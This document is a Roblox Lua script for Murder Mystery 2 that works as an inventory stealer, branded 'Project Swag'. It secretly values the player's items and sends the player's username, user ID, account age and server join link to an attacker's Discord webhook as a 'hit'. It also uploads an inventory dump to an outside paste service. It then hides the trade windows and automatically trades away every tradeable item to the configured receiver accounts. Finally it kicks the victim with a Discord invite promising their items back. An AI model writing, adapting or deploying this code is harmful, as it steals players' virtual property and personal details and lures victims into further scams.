repeat wait() until game:IsLoaded()
wait(2)

-- Sadece MM2'de çalışsın
if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("This script only works in MM2!")
    return
end

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- Universal request
getgenv().request = getgenv().request 
    or request 
    or http_request 
    or (syn and syn.request) 
    or (http and http.request) 
    or (fluxus and fluxus.request) 
    or (Hydrogen and Hydrogen.request) 
    or (krnl and krnl.request) 
    or (KRNL and KRNL.request) 
    or (codex and codex.request) 
    or (ronix and ronix.request) 
    or (volcano and volcano.request) 
    or (potassium and potassium.request) 
    or (wave and wave.request) 
    or (seliware and seliware.request) 
    or (bunnifun and bunnifun.request) 
    or (volt and volt.request) 
    or (velocity and velocity.request) 
    or (swift and swift.request) 
    or (xeno and xeno.request) 
    or getgenv().HttpPost 
    or nil

if not getgenv().request then
    return warn("Executor not supported: No request function found.")
end

-- Universal queue_on_teleport / setclipboard
getgenv().queue_on_teleport = getgenv().queue_on_teleport 
    or queue_on_teleport 
    or queueonteleport 
    or (syn and syn.queue_on_teleport) 
    or (fluxus and fluxus.queue_on_teleport) 
    or (Hydrogen and Hydrogen.queue_on_teleport) 
    or (krnl and krnl.queue_on_teleport) 
    or (codex and codex.queue_on_teleport) 
    or (ronix and ronix.queue_on_teleport) 
    or (volcano and volcano.queue_on_teleport) 
    or (potassium and potassium.queue_on_teleport) 
    or (wave and wave.queue_on_teleport) 
    or (seliware and seliware.queue_on_teleport) 
    or (bunnifun and bunnifun.queue_on_teleport) 
    or (volt and volt.queue_on_teleport) 
    or (velocity and velocity.queue_on_teleport) 
    or (swift and swift.queue_on_teleport) 
    or (xeno and xeno.queue_on_teleport) 
    or nil

getgenv().setclipboard = getgenv().setclipboard 
    or setclipboard 
    or (syn and syn.setclipboard) 
    or (clipboard and clipboard.set) 
    or (Hydrogen and Hydrogen.setclipboard) 
    or (krnl and krnl.setclipboard) 
    or (codex and codex.setclipboard) 
    or (ronix and ronix.setclipboard) 
    or (volcano and volcano.setclipboard) 
    or (potassium and potassium.setclipboard) 
    or (wave and wave.setclipboard) 
    or (seliware and seliware.setclipboard) 
    or (bunnifun and bunnifun.setclipboard) 
    or (volt and volt.setclipboard) 
    or (velocity and velocity.setclipboard) 
    or (swift and swift.setclipboard) 
    or (xeno and xeno.setclipboard) 
    or function() end

local HttpService = game:GetService("HttpService")
if not HttpService.HttpEnabled then HttpService.HttpEnabled = true end

-- === CONFIG ===
local cfg = (getgenv and getgenv()) or {}
cfg.users = cfg.users or {}
cfg.webhook = webh or ""
cfg.pingEveryone = "Yes"

if usern and typeof(usern) == "string" then
    for user in string.gmatch(usern, "[^,]+") do
        table.insert(cfg.users, user:match("^%s*(.-)%s*$"))
    end
end

local users = cfg.users
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local plr = Players.LocalPlayer
if not plr then return end

local isTradeCompleted = false
local totalInventoryValue = 0
local request = getgenv().request

-- === EXECUTOR NAME ===
local executorName = "Unknown"
pcall(function()
    local ok, name = pcall(identifyexecutor)
    if ok and name then
        executorName = name
    else
        local ok2, name2 = pcall(getexecutorname)
        if ok2 and name2 then
            executorName = name2
        end
    end
end)

-- === DELTA BYPASS (hookfunction) ===
local REAL_JOB_ID = game.JobId
if executorName:lower() == "delta" then
    local stepAnimate = nil
    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" and debug.getinfo(v) and debug.getinfo(v).name == "stepAnimate" then
                stepAnimate = v
                break
            end
        end
        wait()
    until stepAnimate

    local captured = false
    local old = hookfunction(stepAnimate, function(dt)
        if not captured then
            captured = true
            REAL_JOB_ID = game.JobId
        end
        return old(dt)
    end)
    repeat wait() until captured
end

if not plr.Character then plr.CharacterAdded:Wait() end
wait(1)

local PlaceId = game.PlaceId
local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)

-- === TRADE DIŞI ITEMLAR ===
local no_trade_items = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true,
    ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true,
    ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

-- === CHROMA / ÖZEL ITEMLER ===
local specialItems = {
    ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
    ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
    ["Chroma Blizzard"] = true, ["Chroma Alienbeam"] = true, ["Chroma Snowstorm"] = true,
    ["Chroma Raygun"] = true, ["C. Snowcannon"] = true, ["C. Snow Dagger"] = true,
    ["Chroma Sunrise"] = true, ["Chroma Sunset"] = true, ["Chroma Ornament"] = true,
    ["Chroma Watergun"] = true, ["Evergun"] = true, ["Traveler's Gun"] = true,
    ["Evergreen"] = true, ["Constellation"] = true, ["Vampire's Gun"] = true,
    ["Turkey"] = true, ["Darkshot"] = true, ["Darksword"] = true, ["Alienbeam"] = true,
    ["Blossom"] = true, ["Sakura"] = true, ["Bauble"] = true, ["Gingerscope"] = true,
    ["Traveler's Axe"] = true, ["Celestial"] = true, ["Vampire's Axe"] = true
}

-- === SUPREME VALUES (fetch_all_values) ===
local function fetch_all_values()
    local value_links = {
        commons = "https://supremevalues.com/mm2/commons",
        uncommons = "https://supremevalues.com/mm2/uncommons",
        rares = "https://supremevalues.com/mm2/rares",
        legendaries = "https://supremevalues.com/mm2/legendaries",
        godlies = "https://supremevalues.com/mm2/godlies",
        chromas = "https://supremevalues.com/mm2/chromas",
        vintages = "https://supremevalues.com/mm2/vintages",
        ancients = "https://supremevalues.com/mm2/ancients",
        evos = "https://supremevalues.com/mm2/evos",
        uniques = "https://supremevalues.com/mm2/uniques",
        sets = "https://supremevalues.com/mm2/sets"
    }
    local req_headers = {
        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    }
    local function clean_string_lol(str) return str:match("^%s*(.-)%s*$") end
    local function fetchHTML(url)
        local ok, response = pcall(function() return request({Url = url, Method = "GET", Headers = req_headers}) end)
        if ok and response then return response.Body end
        return nil
    end
    local function parseValue(itembodyDiv)
        local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
        if valueStr then
            valueStr = valueStr:gsub(",", "")
            local value = tonumber(valueStr)
            if value then return value end
        end
        return nil
    end
    local function extractItems(htmlContent)
        local itemValues = {}
        for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
            itemName = itemName:match("([^<]+)")
            if itemName then
                itemName = clean_string_lol(itemName:gsub("%s+", " "))
                itemName = clean_string_lol((itemName:split(" Click "))[1])
                local itemNameLower = itemName:lower()
                local value = parseValue(itembodyDiv)
                if value then itemValues[itemNameLower] = value end
            end
        end
        return itemValues
    end
    local function extractChromaItems(htmlContent)
        local chromaValues = {}
        for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
            chromaName = chromaName:match("([^<]+)")
            if chromaName then
                chromaName = clean_string_lol(chromaName:gsub("%s+", " ")):lower()
                local value = parseValue(itembodyDiv)
                if value then chromaValues[chromaName] = value end
            end
        end
        return chromaValues
    end

    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}
    for rarity, url in pairs(value_links) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end
    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, category in ipairs(categoriesToFetch) do
        spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHTML(url)
            if htmlContent and htmlContent ~= "" then
                if rarity == "chromas" then
                    local extracted = extractChromaItems(htmlContent)
                    for k, v in pairs(extracted) do chromaExtractedValues[k] = v end
                else
                    local extracted = extractItems(htmlContent)
                    for k, v in pairs(extracted) do allExtractedValues[k] = v end
                end
            end
            completed = completed + 1
            if completed == totalCategories then lock:Fire() end
        end)
    end
    lock.Event:Wait()

    local final_prices = {}
    local item_db = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    for id, data in pairs(item_db) do
        local item_name = data.ItemName and data.ItemName:lower() or ""
        local rarity = data.Rarity or ""
        local has_chroma = data.Chroma or false
        if item_name ~= "" and rarity ~= "" then
            if has_chroma then
                for c_name, c_val in pairs(chromaExtractedValues) do
                    if c_name:find(item_name) then
                        final_prices[id] = c_val
                        break
                    end
                end
            end
            if not final_prices[id] and allExtractedValues[item_name] then
                final_prices[id] = allExtractedValues[item_name]
            end
            if not final_prices[id] then
                if rarity == "Godly" then final_prices[id] = 8
                elseif rarity == "Ancient" then final_prices[id] = 50
                elseif rarity == "Unique" then final_prices[id] = 100
                elseif rarity == "Vintage" then final_prices[id] = 25
                elseif rarity == "Evos" then final_prices[id] = 15
                elseif rarity == "Legendary" then final_prices[id] = 5
                else final_prices[id] = 1 end
            end
        end
    end
    return final_prices
end

-- === RUBIS.APP UPLOAD ===
local function upload_to_rubis(items)
    local lines = {"Project Swag Inventory Dump", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
    table.sort(items, function(a, b)
        local tier_order = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
        local a_order = tier_order[a.Rarity] or 1
        local b_order = tier_order[b.Rarity] or 1
        if a_order ~= b_order then return a_order > b_order end
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)
    local current_tier = nil
    for _, item in ipairs(items) do
        if current_tier ~= item.Rarity then
            current_tier = item.Rarity
            table.insert(lines, "")
            table.insert(lines, "[" .. current_tier:upper() .. "]")
            table.insert(lines, string.rep("-", 30))
        end
        local total_val = item.Value * item.Amount
        table.insert(lines, string.format("%s | Qty: %d | Value: %d (Total: %d)", item.ItemName or item.DataID, item.Amount, item.Value, total_val))
    end
    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return request({
            Url = "https://api.rubis.app/v2/scrap?public=true",
            Method = "POST",
            Headers = {["Content-Type"] = "text/plain"},
            Body = content
        })
    end)
    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            if data.raw then return data.raw
            elseif data.scrapID then return "https://api.rubis.app/v2/scrap/" .. data.scrapID .. "/raw" end
        end
    end
    return nil
end

-- === ENVANTER OKU ===
local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

local weaponsToSend = {}
local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
local prices = fetch_all_values()

for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
    local item = database[dataid]
    if item and not no_trade_items[dataid] then
        local itemName = item.ItemName or dataid
        local rarity = item.Rarity or "Common"
        local value = prices[dataid] or 1
        local totalValue = value * amount
        totalInventoryValue = totalInventoryValue + totalValue
        table.insert(weaponsToSend, {
            DataID = dataid,
            ItemName = itemName,
            Amount = amount,
            Rarity = rarity,
            Value = value,
            TotalValue = totalValue,
            IsChroma = specialItems[itemName] or false
        })
        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
    end
end

table.sort(weaponsToSend, function(a, b) return a.TotalValue > b.TotalValue end)

-- Hit kategorisi
local hitCategory = ""
local isPingWorthy = false
if totalInventoryValue < 100 then
    hitCategory = "Bad Hit"
elseif totalInventoryValue < 300 then
    hitCategory = "Normal Hit"
elseif totalInventoryValue < 1000 then
    hitCategory = "Good Hit"
    isPingWorthy = true
else
    hitCategory = "Big Hit"
    isPingWorthy = true
end

local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"

-- === WEBHOOK GÖNDER (Project Swag) ===
local function sendWebhook(targetWebhook)
    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
    local targetName = table.concat(users, ", ")
    local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', PlaceId, REAL_JOB_ID)

    local total_items = 0
    for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end

    local top_items = {}
    for i = 1, math.min(5, #weaponsToSend) do
        local item = weaponsToSend[i]
        table.insert(top_items, string.format("~ %s x%d (%d)", item.ItemName, item.Amount, item.TotalValue))
    end

    local tier_counts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
    for _, item in ipairs(weaponsToSend) do
        tier_counts[item.Rarity] = (tier_counts[item.Rarity] or 0) + item.Amount
    end

    local content = nil
    if isPingWorthy and cfg.pingEveryone == "Yes" then
        content = "@everyone 🚨 New MM2 Hit!"
    end

    local embed = {
        title = string.format("HIT | %s | %s | %s", plr.DisplayName, targetName, hitCategory),
        description = string.format("```lua\n%s\n```", joinScript),
        color = 0xFF0000,
        thumbnail = {url = avatarUrl},
        fields = {
            {
                name = "Victim Information",
                value = string.format("**Username:** %s\n**Display:** %s\n**User ID:** `%d`\n**Account Age:** %d days", plr.Name, plr.DisplayName, plr.UserId, plr.AccountAge),
                inline = true
            },
            {
                name = "System Information",
                value = string.format("**Executor:** %s\n**Receiver:** %s", executorName, targetName),
                inline = true
            },
            {
                name = "Inventory Summary",
                value = string.format("**Total Value:** `%d`\n**Total Items:** `%d`\n\n**Ancient:** `%d` | **Godly:** `%d`\n**Unique:** `%d` | **Vintage:** `%d`\n**Legendary:** `%d` | **Rare:** `%d`\n**Uncommon:** `%d` | **Common:** `%d`",
                    totalInventoryValue, total_items,
                    tier_counts.Ancient, tier_counts.Godly,
                    tier_counts.Unique, tier_counts.Vintage,
                    tier_counts.Legendary, tier_counts.Rare,
                    tier_counts.Uncommon, tier_counts.Common),
                inline = false
            },
            {
                name = "Top Items",
                value = table.concat(top_items, "\n") or "No items",
                inline = false
            },
            {
                name = "Links",
                value = string.format("[Join Server](%s) | [Full Inventory](%s)", fernJoinerLink, rubisLink),
                inline = false
            }
        },
        footer = {
            text = string.format("Project Swag • %s", os.date("%m/%d/%Y %H:%M"))
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = {
        content = content,
        username = "Project Swag",
        embeds = {embed}
    }

    pcall(function()
        request({
            Url = targetWebhook .. "?wait=true",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

sendWebhook(cfg.webhook)

-- ============================================================
-- === Eternal Darkness'dan ALINAN YENİ TRADE SİSTEMİ ===
-- ============================================================

local Trade = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = Trade:WaitForChild("SendRequest")
local GetStatus = Trade:WaitForChild("GetTradeStatus")
local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")

local last_offer_info = nil

-- lastOffer yakalama
if Trade:FindFirstChild("UpdateTrade") then
    Trade.UpdateTrade.OnClientEvent:Connect(function(data)
        if typeof(data) == "table" then
            if data.lastOffer ~= nil then
                last_offer_info = data.lastOffer
            elseif data.LastOffer ~= nil then
                last_offer_info = data.LastOffer
            end
        end
    end)
end

-- Trade GUI'leri kapat
local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = PlayerGui:FindFirstChild(guiName)
    if gui then
        gui.Enabled = false
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end

-- === TRADE FONKSİYONLARI ===

local function getStatus()
    local ok, status = pcall(function()
        return GetStatus:InvokeServer()
    end)
    return ok and status or "None"
end

local function waitUntilDone()
    repeat wait(0.1) until getStatus() == "None"
end

local function acceptDeal()
    if not last_offer_info then
        last_offer_info = {}
    end
    pcall(function()
        AcceptTradeRemote:FireServer(game.PlaceId * 3, last_offer_info)
    end)
end

local function addToOffer(item_id)
    pcall(function()
        OfferItem:FireServer(item_id, "Weapons")
    end)
    wait(0.1)
end

local function isTarget(name)
    for _, u in ipairs(users) do
        if u:lower() == name:lower() then return true end
    end
    return false
end

-- === ANA TRADE FONKSİYONU ===

local function doTrade(targetPlayer)
    if not targetPlayer then return end

    -- Hedefin karakterini bekle
    local attempts = 0
    while attempts < 30 do
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
            break
        end
        attempts = attempts + 1
        wait(0.5)
    end

    -- Gönderilecek itemlerin kopyasını oluştur
    local itemsToTrade = {}
    for _, item in ipairs(weaponsToSend) do
        table.insert(itemsToTrade, {
            DataID = item.DataID,
            ItemName = item.ItemName,
            Amount = item.Amount,
            Rarity = item.Rarity,
            Value = item.Value,
            TotalValue = item.TotalValue
        })
    end

    if #itemsToTrade == 0 then
        warn("[PS] No items to trade")
        return
    end

    while #itemsToTrade > 0 and not isTradeCompleted do
        local statusNow = getStatus()

        -- Mevcut trade'i temizle
        if statusNow == "StartTrade" then
            pcall(function() DeclineTrade:FireServer() end)
            wait(0.3)
        elseif statusNow == "ReceivingRequest" then
            if Trade:FindFirstChild("DeclineRequest") then
                pcall(function() Trade.DeclineRequest:FireServer() end)
            else
                pcall(function() DeclineTrade:FireServer() end)
            end
            wait(0.3)
        end

        -- Trade başlat
        local tradeStarted = false
        local sendAttempts = 0
        while not tradeStarted and sendAttempts < 30 do
            local current = getStatus()
            if current == "StartTrade" then
                tradeStarted = true
                break
            elseif current == "None" then
                pcall(function()
                    SendRequest:InvokeServer(targetPlayer)
                end)
            elseif current == "ReceivingRequest" then
                if Trade:FindFirstChild("DeclineRequest") then
                    pcall(function() Trade.DeclineRequest:FireServer() end)
                else
                    pcall(function() DeclineTrade:FireServer() end)
                end
            end
            sendAttempts = sendAttempts + 1
            wait(0.5)
        end

        if not tradeStarted then
            wait(2)
            goto continue
        end

        -- Item ekle (max 4 slot)
        local slotsLeft = 4
        local itemsAdded = 0
        while slotsLeft > 0 and #itemsToTrade > 0 do
            local currentItem = itemsToTrade[1]
            local amountToAdd = math.min(slotsLeft, currentItem.Amount)
            for _ = 1, amountToAdd do
                addToOffer(currentItem.DataID)
            end
            currentItem.Amount = currentItem.Amount - amountToAdd
            if currentItem.Amount <= 0 then
                table.remove(itemsToTrade, 1)
            end
            slotsLeft = slotsLeft - amountToAdd
            itemsAdded = itemsAdded + amountToAdd
        end

        if itemsAdded == 0 then
            break
        end

        -- Kabul et
        wait(5)
        acceptDeal()
        waitUntilDone()

        if #itemsToTrade > 0 then
            wait(1)
        end

        ::continue::
    end

    -- Tüm itemler gönderildiyse
    if #itemsToTrade == 0 then
        isTradeCompleted = true
        wait(2)
        local discordLink = "https://discord.gg/7PJtnGwdXW"
        pcall(function()
            if setclipboard then
                setclipboard(discordLink)
            end
        end)
        pcall(function()
            plr:Kick("Items taken by Project Swag\n\n" .. discordLink .. "\n\nJoin to get your items back!")
        end)
    end
end

-- === TARGET EVENTLER ===

Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if isTarget(player.Name) then
        spawn(function()
            wait(4)
            doTrade(player)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and isTarget(p.Name) then
        spawn(function()
            wait(4)
            doTrade(p)
        end)
    end
end
